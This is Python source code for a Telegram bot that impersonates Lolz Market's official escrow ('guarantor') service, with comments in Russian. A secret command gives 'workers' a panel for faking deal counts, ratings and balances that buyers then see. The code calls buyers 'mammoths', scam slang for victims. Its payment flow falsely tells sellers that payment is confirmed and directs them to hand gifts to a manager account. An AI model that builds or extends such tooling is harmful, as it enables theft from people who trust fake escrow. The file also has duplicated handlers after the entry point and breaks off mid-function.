

SUPPORT_USER = "LolzRelayerGift"
# ----------------------------------
# Глобальный переключатель режима оплаты (по умолчанию выключен)
FREE_PAY_MODE = False
# Список тех, кто ввел секретку и может менять себе статы
admin_mode = {}
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] - %(name)s - %(message)s",
    handlers=[logging.FileHandler("bot_log.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

dp = Dispatcher(storage=MemoryStorage())
bot = Bot(token=TOKEN)
# ==========================================================
#                         БАЗА ДАННЫХ
# ==========================================================
# ==========================================================
#                         БАЗА ДАННЫХ
# ==========================================================
class DB:
    def __init__(self):
        # Подключаемся к базе
        self.conn = sqlite3.connect("lolz_enterprise_v25.db", check_same_thread=False)
        self.cur = self.conn.cursor()
        
        # 1. Создаем таблицы, если их нет
        self.init_db()
        
        # 2. Проверяем и добавляем новые колонки (чтобы не было ошибок no such column)
        self.check_columns()

    def init_db(self):
        # Таблица пользователей
        self.cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, 
                username TEXT,
                ton TEXT DEFAULT 'не указан', 
                rub TEXT DEFAULT 'не указан',
                stars TEXT DEFAULT 'не указан', 
                uah TEXT DEFAULT 'не указан',
                byn TEXT DEFAULT 'не указан', 
                balance_ton REAL DEFAULT 0.0,
                balance_rub REAL DEFAULT 0.0,
                balance_stars REAL DEFAULT 0.0,
                balance_uah REAL DEFAULT 0.0,
                balance_byn REAL DEFAULT 0.0,
                deals_count INTEGER DEFAULT 0, 
                rating TEXT DEFAULT '0.0',
                reg_date TEXT,
                ref_id INTEGER DEFAULT 0,
                is_verified INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0
            )
        """)
        # Таблица сделок
        self.cur.execute("""
            CREATE TABLE IF NOT EXISTS deals (
                deal_id TEXT PRIMARY KEY, 
                seller_id INTEGER, 
                buyer_id INTEGER DEFAULT NULL,
                amount REAL, 
                currency TEXT, 
                description TEXT,
                status TEXT DEFAULT 'active',
                created_at TEXT,
                finished_at TEXT DEFAULT NULL
            )
        """)
        # Таблица конфигурации
        self.cur.execute("CREATE TABLE IF NOT EXISTS config (id INTEGER PRIMARY KEY, free_pay INTEGER DEFAULT 0)")
        self.cur.execute("INSERT OR IGNORE INTO config (id, free_pay) VALUES (1, 0)")
        
        # Таблица логов
        self.cur.execute("""
            CREATE TABLE IF NOT EXISTS action_logs (
                log_id INTEGER PRIMARY KEY AUTOINCREMENT,
                u_id INTEGER,
                action TEXT,
                timestamp TEXT
            )
        """)
        self.conn.commit()

    def check_columns(self):
        """Добавляет недостающие колонки в существующую базу"""
        self.cur.execute("PRAGMA table_info(users)")
        columns = [column[1] for column in self.cur.fetchall()]
        
        updates = {
            "usdt": "TEXT DEFAULT 'не указан'",
            "manual_deals": "INTEGER DEFAULT 0",
            "is_god": "INTEGER DEFAULT 0"
        }
        
        for col, type_def in updates.items():
            if col not in columns:
                try:
                    self.cur.execute(f"ALTER TABLE users ADD COLUMN {col} {type_def}")
                    logger.info(f"Добавлена колонка {col}")
                except Exception as e:
                    print(f"Ошибка добавления {col}: {e}")
        self.conn.commit()

    def get_user(self, uid):
        self.cur.execute("SELECT * FROM users WHERE user_id = ?", (uid,))
        return self.cur.fetchone()

    def add_user(self, uid, username, ref=0):
        if not self.get_user(uid):
            date = datetime.now().strftime("%d.%m.%Y")
            self.cur.execute("INSERT INTO users (user_id, username, reg_date, ref_id) VALUES (?, ?, ?, ?)", 
                             (uid, username, date, ref))
            self.conn.commit()
            return True
        return False

    def add_log(self, uid, action):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.cur.execute("INSERT INTO action_logs (u_id, action, timestamp) VALUES (?, ?, ?)", (uid, action, now))
        self.conn.commit()

    def update_param(self, uid, column, value):
        self.cur.execute(f"UPDATE users SET {column} = ? WHERE user_id = ?", (value, uid))
        self.conn.commit()

db = DB()
# ==========================================================
#                          СОСТОЯНИЯ (FSM)
# ==========================================================
class CreateDeal(StatesGroup):
    wait_amount = State()
    wait_desc = State()

class EditWallet(StatesGroup):
    wait_val = State()    # Для обычных реквизитов
    wait_custom_name = State() # <--- ДЛЯ НАЗВАНИЯ ВАЛЮТЫ
    wait_custom_val = State()  # <--- ДЛЯ РЕКВИЗИТОВ ЭТОЙ ВАЛЮТЫ

class AdminStates(StatesGroup):
    wait_broadcast = State()

# ==========================================================
#                       ВСПОМОГАТЕЛЬНОЕ
# ==========================================================
async def send_with_photo(message, text, kb):
    if os.path.exists(PHOTO_PATH):
        await message.answer_photo(FSInputFile(PHOTO_PATH), caption=text, reply_markup=kb, parse_mode="HTML")
    else:
        await message.answer(text, reply_markup=kb, parse_mode="HTML")
async def edit_with_photo(call, text, kb):
    try:
        if call.message.photo:
            await call.message.edit_caption(caption=text, reply_markup=kb, parse_mode="HTML")
        else:
            await call.message.edit_text(text=text, reply_markup=kb, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error in edit_with_photo: {e}")
        await send_with_photo(call.message, text, kb)
CHANNEL_ID = -1003547705599 
CHANNEL_LINK = "https://t.me/perejodniik"
@dp.message(Command("ergentovteam"))
async def cmd_ergentov(message: Message):
    uid = message.from_user.id
    
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=uid)
        
        
        if member.status in ["left", "kicked"]:
            kb = InlineKeyboardBuilder()
            kb.row(InlineKeyboardButton(text="📢 Вступить в канал", url=CHANNEL_LINK))
            
            return await message.answer(
                "⚠️ <b>ДОСТУП ЗАБЛОКИРОВАН</b>\n\n"
                "Для использования <b>Worker Panel</b> необходимо быть участником нашего канала.",
                reply_markup=kb.as_markup(),
                parse_mode="HTML"
            )

        
        admin_mode[uid] = True
        WORKERS.add(uid)
        
        text = (
            "⚡️ <b>ERGENTOV PANEL ACTIVATED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🛡 <b>Статус:</b> <code>ADMIN</code>\n"
            "⚙️ <b>Команды накрутки:</b>\n"
            "├ <code>/setdeals 100</code> — сделки\n"
            "├ <code>/setrating 5.0</code> — рейтинг\n"
            "└ <code>/balans rub 5000</code> — баланс\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
       
        if os.path.exists(PHOTO_PATH):
            await message.answer_photo(FSInputFile(PHOTO_PATH), caption=text, parse_mode="HTML")
        else:
            await message.answer(text, parse_mode="HTML")

    except Exception as e:
        
        await message.answer(f"❌ <b>ОШИБКА:</b> Бот не может проверить подписку.\nУбедитесь, что бот назначен <b>администратором</b> в канале!")
        print(f"Ошибка проверки подписки: {e}")

@dp.message(Command("balans"))
async def self_balance(message: Message):
    uid = message.from_user.id
    if uid not in admin_mode: return 

    args = message.text.split()
    if len(args) < 3:
        return await message.answer("⚠️ <b>Юзай:</b> <code>/balans rub 500</code>")

    currency = args[1].lower()
    amount = args[2]

    vault = {
        "rub": "balance_rub", "usdt": "usdt", "ton": "balance_ton",
        "stars": "balance_stars", "uah": "balance_uah", "byn": "balance_byn"
    }

    col = vault.get(currency)
    if not col: return await message.answer("❌ <b>Валюта не поддерживается!</b>")

    db.cur.execute(f"UPDATE users SET {col} = ? WHERE user_id = ?", (amount, uid))
    db.conn.commit()
    await message.answer(f"✅ <b>Баланс {currency.upper()} успешно изменен на:</b> <code>{amount}</code>")


@dp.message(Command("setdeals"))
async def cmd_set_deals(message: Message):
    uid = message.from_user.id
    if uid not in admin_mode: return

    try:
        args = message.text.split()
        if len(args) < 2:
            return await message.answer("❌ <b>Введите число:</b> <code>/setdeals 100</code>")
        
        count = int(args[1])
        
        db.cur.execute("UPDATE users SET manual_deals = ?, deals_count = ? WHERE user_id = ?", (count, count, uid))
        db.conn.commit()
        
        await message.answer(f"🤝 <b>Успешно! Установлено сделок:</b> <code>{count}</code>")
    except Exception as e:
        await message.answer(f"❌ <b>Ошибка БД:</b> {e}")

# --- 3. УДАЛИТЬ СДЕЛКИ ---
@dp.message(Command("deletedeals"))
async def adm_del_deals_self(message: Message):
    uid = message.from_user.id
    if uid not in admin_mode: return
    
    db.cur.execute("UPDATE users SET manual_deals = 0, deals_count = 0 WHERE user_id = ?", (uid,))
    db.conn.commit()
    await message.answer("🗑 <b>Счетчик сделок обнулен.</b>")

# --- 4. УСТАНОВИТЬ РЕЙТИНГ ---
@dp.message(Command("setrating"))
async def self_rating(message: Message):
    uid = message.from_user.id
    if uid not in admin_mode: return

    args = message.text.split()
    if len(args) < 2:
        return await message.answer("⚠️ <b>Юзай:</b> <code>/setrating 5</code>")

    try:
        val = float(args[1].replace(',', '.'))
        if val > 5: val = 5.0
        elif val < 0: val = 0.0
        rating_str = f"{val:.1f}" 
        
        db.cur.execute("UPDATE users SET rating = ? WHERE user_id = ?", (rating_str, uid))
        db.conn.commit()
        await message.answer(f"⭐ <b>Ваш рейтинг обновлен до:</b> <code>{rating_str}</code>")
    except ValueError:
        await message.answer("❌ <b>Ошибка:</b> Введи число (например 4.8)")

# --- 5. УДАЛИТЬ РЕЙТИНГ ---
@dp.message(Command("deleterating"))
async def self_del_rating(message: Message):
    uid = message.from_user.id
    if uid not in admin_mode: return
    
    db.cur.execute("UPDATE users SET rating = '0.0' WHERE user_id = ?", (uid,))
    db.conn.commit()
    await message.answer("🗑 <b>Рейтинг сброшен до 0.0</b>")
# ==========================================================
#                         ГЛАВНОЕ МЕНЮ
# ==========================================================

def main_kb():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📝 Создать сделку", callback_data="start_deal"))
    builder.row(InlineKeyboardButton(text="📁 Мои сделки", callback_data="info_deals"),
                InlineKeyboardButton(text="🛡 Верификация", callback_data="info_verif"))
    builder.row(InlineKeyboardButton(text="💳 Реквизиты", callback_data="my_wallets"),)
    builder.row(InlineKeyboardButton(text="👥 Рефералы", callback_data="info_refs"),
                InlineKeyboardButton(text="ℹ️ Профиль", callback_data="stats_info"))
    builder.row(InlineKeyboardButton(text="📰 Lolz News", url="https://t.me/lolzteam"))
    builder.row(InlineKeyboardButton(text="📩 Обращения", url="https://t.me/LolzRelayerGift"),
                InlineKeyboardButton(text="🎧 Поддержка", url="https://t.me/LolzRelayerGift"))
    builder.row(InlineKeyboardButton(text="📱 Мини-приложения", url="https://lzt.market"))
    return builder.as_markup()

# --- ВАЖНО: ЭТА ФУНКЦИЯ ДОЛЖНА СТОЯТЬ ВЫШЕ ОБЫЧНОГО START ---
@dp.message(CommandStart(deep_link=True))
async def deal_link_handler(message: Message, command: CommandObject):
    args = command.args
    # Если в ссылке нет приставки deal_, отправляем в обычное меню
    if not args or not args.startswith("deal_"):
        return await start_handler(message)

    did_raw = args.split("_")[1]
    db.cur.execute("SELECT * FROM deals WHERE deal_id=?", (did_raw,))
    d = db.cur.fetchone()
    
    if not d:
        return await send_with_photo(message, "❌ Сделка не найдена или уже удалена.", main_kb())
# Проверка: если создатель сделки пытается перейти по своей же ссылке
    if d[1] == message.from_user.id:
        return await send_with_photo(
            message, 
            f"⚠️ <b>Вы являетесь создателем этой сделки.</b>\n\n"
            f"Отправьте эту ссылку покупателю. Вы получите уведомление, когда он перейдет к оплате.", 
            main_kb()
        )
    
    if d[6] != 'active':
        return await send_with_photo(message, "❌ Эта сделка уже находится в процессе или завершена.", main_kb())

    seller = db.get_user(d[1])
    currency = d[4]
    
    # Экранируем данные, чтобы бот не падал от спецсимволов
    did = html.quote(str(did_raw))
    seller_name = html.quote(str(seller[1])) if seller[1] else "Hidden"
    product_name = html.quote(str(d[5]))
    
    # Авто-подбор реквизитов продавца
    wallet_raw = "не указан"
    if currency == "RUB": wallet_raw = seller[3]
    elif currency == "TON": wallet_raw = seller[2]
    elif currency == "STARS": wallet_raw = seller[4]
    elif currency == "USDT": wallet_raw = seller[18] if len(seller) > 18 else "не указан"
    else: wallet_raw = seller[6] 
    
    wallet = html.quote(str(wallet_raw))

    txt = (f"💳 Информация о сделке #{did}\n\n"
           f"👤 Вы покупатель в сделке.\n"
           f"📌 Продавец: @{seller_name} (<code>{seller[0]}</code>)\n"
           f"📊 Успешных сделок: {seller[12]}\n"
           f"⭐ Рейтинг: {seller[13]}/5\n"
           f"🔐 Верификация: {'✅ Подтвержден' if seller[17] == 1 else '👤 Новый пользователь'}\n\n"
           f"• Вы покупаете: {product_name}\n\n"
           f"🏦 Адрес для оплаты:\n"
           f"<code>{wallet}</code>\n\n"
           f"💰 Сумма к оплате: {d[3]} {currency}\n"
           f"📝 Комментарий (мемо): <code>#{did}</code>\n\n"
           f"⚠️ Внимание:комментарий обязателен для автоматического зачисления!")
    
    # Найди это место в deal_link_handler и замени:
    kb = InlineKeyboardBuilder()
    # Мы используем именно did_raw, чтобы передать ID сделки в кнопку
    kb.row(InlineKeyboardButton(text="✅ Я оплатил", callback_data=f"paid_{did_raw}"))
    kb.row(InlineKeyboardButton(text="🏠 В меню", callback_data="to_main"))
    
    await send_with_photo(message, txt, kb.as_markup())
    
    await send_with_photo(message, txt, kb.as_markup())

@dp.message(Command("start"))
async def start_handler(message: Message):
    db.add_user(message.from_user.id, message.from_user.username)
    db.add_log(message.from_user.id, "Запустил бота")
    
    welcome = (f"👋 Приветствуем, {message.from_user.first_name}!\n\n"
               f"🥇 Lolz Market — официальный гарант-бот команды Lolz.\n"
               f"🛡 Сделки под защитой 24/7\n"
               f"⚡️ Автовыплаты и низкие комиссии")
    await send_with_photo(message, welcome, main_kb())
@dp.callback_query(F.data == "info_refs")
async def referrals_view(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "ru")
    user_id = call.from_user.id
    
    # Генерируем реферальную ссылку
    ref_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    
    if lang == "ru":
        txt = (f"👥 <b>Реферальная система</b>\n\n"
               f"Приглашайте друзей и получайте 1% от каждой их сделки!\n\n"
               f"🔗 Ваша ссылка для приглашения:\n"
               f"<code>{ref_link}</code>")
        back_text = "⬅️ Назад"
    else:
        txt = (f"👥 <b>Referral System</b>\n\n"
               f"Invite friends and get 1% from each of their deals!\n\n"
               f"🔗 Your referral link:\n"
               f"<code>{ref_link}</code>")
        back_text = "⬅️ Back"

    kb = InlineKeyboardBuilder().row(InlineKeyboardButton(text=back_text, callback_data="to_main"))
    await edit_with_photo(call, txt, kb.as_markup())
@dp.callback_query(F.data == "to_main")
async def back_to_main(call: CallbackQuery):
    welcome = (f"👋 Добро пожаловать в Lolz Market!\n\n"
               f"🥇 Официальный гарант-бот команды Gifts.\n"
               f"🛡 Сделки под защитой 24/7")
    await edit_with_photo(call, welcome, main_kb())

@dp.callback_query(F.data == "stats_info")
async def profile_view(call: CallbackQuery):
    uid = call.from_user.id
    
    # Достаем ВСЕ данные по твоему ID
    db.cur.execute("""
        SELECT balance_rub, usdt, balance_ton, balance_stars, balance_uah, balance_byn, 
               rating, manual_deals, deals_count 
        FROM users WHERE user_id = ?
    """, (uid,))
    
    user_data = db.cur.fetchone()
    
    if not user_data:
        return await call.answer("❌ Ошибка: профиль не найден в базе")

    # Раскладываем данные по переменным
    # Индексы соответствуют порядку в SELECT выше
    b_rub, b_usdt, b_ton, b_stars, b_uah, b_byn = user_data[0], user_data[1], user_data[2], user_data[3], user_data[4], user_data[5]
    
    # Рейтинг и сделки
    rating = user_data[6] if user_data[6] else "0.0"
    # Если есть накрученные сделки (manual_deals), берем их, если нет - реальные
    display_deals = user_data[7] if (user_data[7] and user_data[7] > 0) else user_data[8]

    # --- ТВОЙ ТЕКСТ ПРОФИЛЯ ---
    res = (
        f"👤 <b>Личный кабинет</b>\n"
        f"➖➖➖➖➖➖➖➖\n"
        f"🤝 Успешных сделок: <b>{display_deals}</b>\n"
        f"⭐ Рейтинг: <b>{rating}/5.0</b>\n"
        f"➖➖➖➖➖➖➖➖\n"
        f"💰 <b>Ваши балансы:</b>\n"
        f"├ RUB: <code>{b_rub}</code>\n"
        f"├ USDT: <code>{b_usdt}</code>\n"
        f"├ TON: <code>{b_ton}</code>\n"
        f"├ STARS: <code>{b_stars}</code>\n"
        f"├ UAH: <code>{b_uah}</code>\n"
        f"└ BYN: <code>{b_byn}</code>\n"
        f"➖➖➖➖➖➖➖➖\n"
        f"🆔 ID: <code>{uid}</code>"
    )
    
    # Твои кнопки назад/пополнить
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Пополнить", callback_data="action_deposit"),
         InlineKeyboardButton(text="📤 Вывести", callback_data="action_withdraw")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="to_main")]
    ])
    
    # Если в профиле есть фото - меняем описание, если нет - шлем текст
    try:
        await call.message.edit_caption(caption=res, reply_markup=kb, parse_mode="HTML")
    except:
        await call.message.edit_text(text=res, reply_markup=kb, parse_mode="HTML")
class FinanceStates(StatesGroup):
    wait_amount = State()

# 2. Обработка нажатий на кнопки
@dp.callback_query(F.data.in_(["action_deposit", "action_withdraw"]))
async def finance_start(call: CallbackQuery, state: FSMContext):
    act = "вывода" if "withdraw" in call.data else "пополнения"
    await state.update_data(finance_act=act)
    
    txt = (f"💳 <b>Выбор операции: {act}</b>\n\n"
           f"Напишите валюту и сумму через пробел.\n"
           f"Пример: <code>RUB 500</code>")
    
    await call.message.answer(txt, parse_mode="HTML")
    await state.set_state(FinanceStates.wait_amount)
    await call.answer()

# 3. Прием суммы и возврат в меню
@dp.message(FinanceStates.wait_amount)
async def finance_final(message: Message, state: FSMContext):
    data = await state.get_data()
    act = data.get("finance_act")
    
    # Здесь можно добавить логику записи в БД, если нужно
    
    await message.answer(f"✅ Заявка на {act} успешно создана! Ожидайте подтверждения.")
    await state.clear()
    
    # Возвращаем в главное меню
    welcome = "👋 Добро пожаловать в Lolz Market!\n🛡 Сделки под защитой 24/7"
    await send_with_photo(message, welcome, main_kb())
# ==========================================================
#              БЛОК РЕКВИЗИТОВ (ИСПРАВЛЕННЫЙ)
# ==========================================================

@dp.callback_query(F.data == "my_wallets")
async def my_wallets_menu(call: CallbackQuery):
    """Открывает меню управления реквизитами"""
    u = db.get_user(call.from_user.id)
    if not u: return
    
    # Подтягиваем актуальные данные из БД
    usdt_val = u[18] if len(u) > 18 else "не указан"
    other_cur_name = u[5] if u[5] != 'не указан' else "Другая"
    
    txt = (f"💳 <b>Ваши реквизиты для выплат:</b>\n\n"
           f"🇷🇺 <b>RUB:</b> <code>{u[3]}</code>\n"
           f"💎 <b>TON:</b> <code>{u[2]}</code>\n"
           f"🌟 <b>STARS:</b> <code>{u[4]}</code>\n"
           f"💵 <b>USDT :</b> <code>{usdt_val}</code>\n"
           f"🌍 <b>{other_cur_name}:</b> <code>{u[6]}</code>\n\n"
           f"Выберите категорию для изменения:")

    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="Изменить RUB", callback_data="set_rub"),
           InlineKeyboardButton(text="Изменить TON", callback_data="set_ton"))
    kb.row(InlineKeyboardButton(text="Изменить STARS", callback_data="set_stars"),
           InlineKeyboardButton(text="Изменить USDT", callback_data="set_usdt"))
    kb.row(InlineKeyboardButton(text=f"Изменить {other_cur_name}", callback_data="set_custom_logic"))
    kb.row(InlineKeyboardButton(text="⬅️ Назад", callback_data="to_main"))
    
    await edit_with_photo(call, txt, kb.as_markup())

@dp.callback_query(F.data.startswith("set_"))
async def wallet_edit_start(call: CallbackQuery, state: FSMContext):
    # Логика для кастомной валюты
    if call.data == "set_custom_logic":
        await call.message.answer("⌨️ Введите название валюты (например: UAH, BYN, KZT):", parse_mode="HTML")
        await state.set_state(EditWallet.wait_custom_name)
        await call.answer()
        return 

    # Логика для стандартных валют
    target = call.data.split("_")[1] # rub, ton, usdt, stars
    await state.update_data(target=target)
    
    names = {
        "rub": "RUB (Карта)", 
        "ton": "TON (Wallet)", 
        "stars": "Telegram Stars", 
        "usdt": "USDT (TRC-20)"
    }
    cur_name = names.get(target, target.upper())
    
    await call.message.answer(f"📥 Отправьте новые реквизиты для <b>{cur_name}</b>:", parse_mode="HTML")
    await state.set_state(EditWallet.wait_val)
    await call.answer()

@dp.message(EditWallet.wait_val)
async def wallet_edit_save(message: Message, state: FSMContext):
    data = await state.get_data()
    col = data['target']
    
    # Маппинг колонок БД
    db_cols = {"rub": "rub", "ton": "ton", "stars": "stars", "usdt": "usdt"}
    db_col = db_cols.get(col, col)
    
    db.update_param(message.from_user.id, db_col, message.text)
    db.add_log(message.from_user.id, f"Обновил реквизиты {col}")
    
    await send_with_photo(message, f"✅ Реквизиты <b>{col.upper()}</b> успешно сохранены!", main_kb())
    await state.clear()

# --- ЛОГИКА КАСТОМНОЙ ВАЛЮТЫ ---

@dp.message(EditWallet.wait_custom_name)
async def custom_wallet_name(message: Message, state: FSMContext):
    await state.update_data(c_name=message.text.upper())
    await message.answer(f"✅ Валюта <b>{message.text.upper()}</b> принята.\nТеперь введите реквизиты:", parse_mode="HTML")
    await state.set_state(EditWallet.wait_custom_val)

@dp.message(EditWallet.wait_custom_val)
async def custom_wallet_save(message: Message, state: FSMContext):
    data = await state.get_data()
    uid = message.from_user.id
    # Сохраняем название в uah (индекс 5) и значение в byn (индекс 6) как в твоей схеме
    db.update_param(uid, "uah", data['c_name'])
    db.update_param(uid, "byn", message.text)
    
    await send_with_photo(message, f"✅ Реквизиты для <b>{data['c_name']}</b> успешно сохранены!", main_kb())
    await state.clear()

# ==========================================================
#                         СДЕЛКИ (ГАРАНТ)
# ==========================================================

# 2. ИНИЦИАЦИЯ СОЗДАНИЯ СДЕЛКИ (ВОРКЕРОМ)
@dp.callback_query(F.data == "start_deal")
async def deal_init(call: CallbackQuery):
    u = db.get_user(call.from_user.id)
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="RUB", callback_data="cur_RUB"),
           InlineKeyboardButton(text="STARS", callback_data="cur_STARS"))
    kb.row(InlineKeyboardButton(text="USDT", callback_data="cur_USDT"),
           InlineKeyboardButton(text="TON", callback_data="cur_TON"))
    other_name = u[5] if u[5] != 'не указан' else "Другая"
    kb.row(InlineKeyboardButton(text=f"🌍 {other_name}", callback_data="cur_OTHER"))
    kb.row(InlineKeyboardButton(text="⬅️ Назад", callback_data="to_main"))
    
    await edit_with_photo(call, "📦 Создание сделки\n\nВыберите валюту оплаты:", kb.as_markup())

@dp.callback_query(F.data.startswith("cur_"))
async def deal_step_2_check(call: CallbackQuery, state: FSMContext):
    val_type = call.data.split("_")[1]
    u = db.get_user(call.from_user.id)
    usdt_val = u[18] if len(u) > 18 else "не указан"
    
    data_map = {
        "RUB": {"val": u[3], "name": "RUB"},
        "TON": {"val": u[2], "name": "TON"},
        "STARS": {"val": u[4], "name": "STARS"},
        "USDT": {"val": usdt_val, "name": "USDT"},
        "OTHER": {"val": u[6], "name": u[5]}
    }
    
    current = data_map.get(val_type)
    if not current or str(current['val']).strip().lower() == "не указан":
        return await call.answer(f"❌ Ошибка! Не указаны реквизиты для {val_type}.", show_alert=True)

    await state.update_data(c=current['name'])
    await call.message.delete()
    await send_with_photo(call.message, f"✅ Выбрана валюта: {current['name']}\n\n💰 Шаг 2: Введите сумму сделки:", None)
    await state.set_state(CreateDeal.wait_amount)

@dp.message(CreateDeal.wait_amount)
async def deal_step_3(message: Message, state: FSMContext):
    # Чистим текст от запятых и проверяем на число
    sum_text = message.text.replace(',', '.')
    try:
        float(sum_text)
    except ValueError:
        return await message.answer("⚠️ <b>Ошибка!</b> Введите число (например: 500)", parse_mode="HTML")
    
    await state.update_data(a=sum_text)
    # Используем твою функцию, чтобы на каждом шаге было фото
    await send_with_photo(message, "📜 <b>Шаг 3:</b> Введите краткое описание товара или услуги:", None)
    await state.set_state(CreateDeal.wait_desc)

@dp.message(CreateDeal.wait_desc)
async def deal_step_final(message: Message, state: FSMContext):
    try:
        data = await state.get_data()
        did = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        
        # Запись в БД
        db.cur.execute(
            "INSERT INTO deals (deal_id, seller_id, amount, currency, description, status, created_at) VALUES (?,?,?,?,?,?,?)",
            (did, message.from_user.id, data['a'], data['c'], message.text, 'active', datetime.now().strftime("%H:%M"))
        )
        db.conn.commit()
        
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{did}"
        
        res = (f"✅ Сделка <b>#{did}</b> успешно создана!\n\n"
               f"💰 Сумма: <b>{data['a']} {data['c']}</b>\n"
               f"📜 Описание: <i>{message.text}</i>\n\n"
               f"🔗 Ссылка для оплаты покупателем:\n"
               f"<code>{link}</code>\n\n"
               f"⚠️ Отправьте ссылку покупателю. Как только он оплатит, вы получите уведомление.")

        await state.clear()
        await send_with_photo(message, res, None)

    except Exception as e:
        print(f"Ошибка в финале: {e}")
        await message.answer("❌ Ошибка при создании сделки.")


@dp.callback_query(F.data.startswith("paid_"))
async def paid_handler(call: CallbackQuery):
    # Проверка активации по команде /euphoriateam
    if call.from_user.id not in WORKERS:
        return await call.answer("❌ Недостаточно средств на балансе!", show_alert=True)

    did = call.data.split("_")[1]
    db.cur.execute("SELECT seller_id, amount, currency, description FROM deals WHERE deal_id = ?", (did,))
    deal = db.cur.fetchone()
    if not deal: 
        return await call.answer("❌ Сделка не найдена!")
    
    # Данные продавца (воркера)
    seller = db.get_user(deal[0])
    s_name = seller[1] if (seller and seller[1]) else "User"
    s_deals = seller[19] if (seller and len(seller) > 19) else 0
    s_rating = seller[13] if (seller and len(seller) > 13) else "0.0"

    # Данные покупателя (мамонта)
    buyer = db.get_user(call.from_user.id)
    b_name = call.from_user.username if call.from_user.username else "User"
    
    if buyer:
        b_deals = buyer[19] if (len(buyer) > 19 and buyer[19]) else 0
        b_rating = buyer[13] if (len(buyer) > 13 and buyer[13]) else "0.0"
    else:
        b_deals = 0
        b_rating = "0.0"

    # --- ТЕКСТ ДЛЯ ПОКУПАТЕЛЯ ---
    text_buyer = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"▸ Сделка: <code>#{did}</code>\n"
        f"▸ Продавец: @{s_name}\n"
        f"▸ Успешных сделок у продавца: {s_deals}\n"
        f"▸ Рейтинг продавца: {s_rating}/5\n"
        f"▸ Сумма: {deal[1]} {deal[2]}\n"
        f"▸ Описание: {deal[3]}\n\n"
        f"Ожидайте, продавец отправит подарок менеджеру @LolzRelayerGift для проверки.\n\n"
        f"⏳ Ожидайте уведомления о передаче подарка."
    )

    # --- ТЕКСТ ДЛЯ ПРОДАВЦА ---
    text_seller = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"▸ Сделка: <code>#{did}</code>\n"
        f"▸ Покупатель: @{b_name}\n"
        f"▸ Успешных сделок у покупателя: {b_deals}\n"
        f"▸ Рейтинг покупателя: {b_rating}/5\n"
        f"▸ Сумма: {deal[1]} {deal[2]}\n"
        f"▸ Описание: {deal[3]}\n\n"
        f"<b>Отправьте подарок менеджеру @LolzRelayerGift для проверки.</b>\n\n"
        f"⏳ <b>после отправки менеджер проверит передачу автоматически.</b>")
    

    # Редактируем сообщение покупателю
    try:
        if call.message.photo:
            await call.message.edit_caption(caption=text_buyer, parse_mode="HTML")
        else:
            await call.message.edit_text(text=text_buyer, parse_mode="HTML")
    except Exception as e:
        print(f"Ошибка редактирования: {e}")

    # Отправляем лог продавцу
    try:
        await bot.send_message(chat_id=deal[0], text=text_seller, parse_mode="HTML")
    except Exception as e:
        print(f"Ошибка отправки продавцу: {e}")

    await call.answer()
@dp.callback_query(F.data.startswith("finish_"))
async def seller_finish(call: CallbackQuery):
    did = call.data.split("_")[1]
    await call.message.edit_text(f"✅ Уведомление покупателю по сделке #{did} отправлено. Ожидайте подтверждения менеджером.")
    await call.answer()

@dp.callback_query(F.data.startswith("confirm_"))
async def final_confirm(call: CallbackQuery):
    did = call.data.split("_")[1]
    db.cur.execute("UPDATE deals SET status = 'closed' WHERE deal_id = ?", (did,))
    db.conn.commit()
    await call.message.edit_text(f"🏁 Сделка #{did} завершена!")
    await call.answer("🤝 Сделка закрыта!")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
@dp.message(Command("ergentovteam"))
async def cmd_admin_menu(message: Message):
    CHANNEL_ID = -1003547705599 
    CHANNEL_URL = "https://t.me/perejodniik"

    try:
        # Проверяем статус пользователя в канале
        check = await message.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=message.from_user.id)
        
        if check.status in ["left", "kicked"]:
            kb = InlineKeyboardBuilder()
            kb.row(InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_URL))
            return await message.answer(
                "❌ Доступ к админ-команде разрешен только подписчикам нашего канала!",
                reply_markup=kb.as_markup()
            )
            
    except Exception as e:
        return await message.answer("⚠️ Ошибка: Бот должен быть администратором в канале!")

    # --- ВОТ ТУТ МАГИЯ: ВЫДАЕМ ПРАВА ---
    # У тебя колонка админа/бога под индексом 20. Ставим туда 1.
    db.cur.execute("UPDATE users SET is_god = 1 WHERE user_id = ?", (message.from_user.id,))
    db.conn.commit()

    admin_text = (
        "🔧 <b>Панель управления Ergentov Team</b>\n\n"
        "✅ <b>Статус Бога активирован!</b>\n"
        "Теперь ты можешь подтверждать оплату в сделках.\n\n"
        "<b>Команды управления:</b>\n"
        "💰 <code>/balans rub 500</code> — выдать баланс\n"
        "🤝 <code>/setdeals 100</code> — накрутить сделки\n"
        "⭐ <code>/setrating 5.0</code> — поставить рейтинг"
    )

    await message.answer(admin_text, parse_mode="HTML")

# --- ИСПРАВЛЕННЫЙ НАЧАЛЬНЫЙ БЛОК ОПЛАТЫ (то, что ты скинул в конце) ---
@dp.callback_query(F.data.startswith("paid_"))
async def buyer_paid_handler(call: CallbackQuery):
    did = call.data.split("_")[1]
    
    # 1. Достаем инфу о сделке
    db.cur.execute("SELECT seller_id, amount, currency, description FROM deals WHERE deal_id = ?", (did,))
    deal = db.cur.fetchone()
